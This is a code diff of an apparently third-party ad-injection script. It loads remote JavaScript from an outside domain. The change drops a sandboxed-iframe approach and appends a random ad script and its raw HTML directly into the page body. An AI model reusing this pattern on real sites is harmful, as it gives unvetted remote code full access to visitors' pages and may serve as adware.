@@ -25,65 +25,37 @@ const injectArr = [{
   src: 'https://se.jmf47.cn/slotJs_83.js',
 }];
 
-function guid() {
-  function s4() {
-    return Math.floor((1 + Math.random()) * 0x10000)
-      .toString(16)
-      .substring(1);
-  }
-  return `${s4()}${s4()}-${s4()}-${s4()}-${s4()}-${s4()}${s4()}${s4()}-${s4()}${s4()}`;
-}
-
-const pageId = guid();
-const randomId = () => `ad${Math.random().toString(36).substr(2)}`;
+// function guid() {
+//   function s4() {
+//     return Math.floor((1 + Math.random()) * 0x10000)
+//       .toString(16)
+//       .substring(1);
+//   }
+//   return `${s4()}${s4()}-${s4()}-${s4()}-${s4()}-${s4()}${s4()}${s4()}-${s4()}${s4()}`;
+// }
 
 
 function getAd() {
-  // const adIndex = Math.floor(Math.random() * adArr.length);
+  const adIndex = Math.floor(Math.random() * adArr.length);
   // const blackIndex = Math.floor(Math.random() * injectArr.length);
 
   const adInject = '';
 
-  for (let adIndex = 0; adIndex < adArr.length; adIndex++) {
-    const adBottom = adArr[adIndex] || '';
+  const adBottom = adArr[adIndex] || '';
 
-    const iframe = document.createElement('iframe');
+  if (adBottom && adBottom.src) {
+    if (adBottom.append) {
+      $('body').append(adBottom.append);
+    }
+
     const src = document.createElement('script');
 
-    iframe.id = `ad${adIndex}`;
-    iframe.frameBorder = '0';
-    iframe.scrolling = 'no';
-    iframe.marginwidth = '0';
-    iframe.marginheight = '0';
-    iframe.width = '100%';
-    iframe.height = '96px';
-    iframe.sandbox = 'allow-forms allow-scripts allow-same-origin allow-popups';
-    if (adIndex == 0) {
-      iframe.setAttribute('style', 'position:absolute;bottom:0px;z-index:999');
-    } else {
-      iframe.setAttribute('style', 'position:absolute;top:0px;z-index:999');
-    }
-
-
-    document.body.appendChild(iframe);
-
-    const x = document.getElementById(`ad${adIndex}`);
-    let y = (x.contentWindow || x.contentDocument);
-    if (y.document)y = y.document;
-
-    if (adBottom && adBottom.src) {
-      if (adBottom.append) {
-        // y.body.innerHTML = adBottom.append;
+    for (const key in adBottom) {
+      if (key !== 'append') {
+        src[key] = adBottom[key];
       }
-
-      for (const key in adBottom) {
-        if (key !== 'append') {
-          src[key] = adBottom[key];
-        }
-      }
-
-      y.body.append(src);
     }
+    $('body').append(src);
   }
 
   if (adInject && adInject.src) {
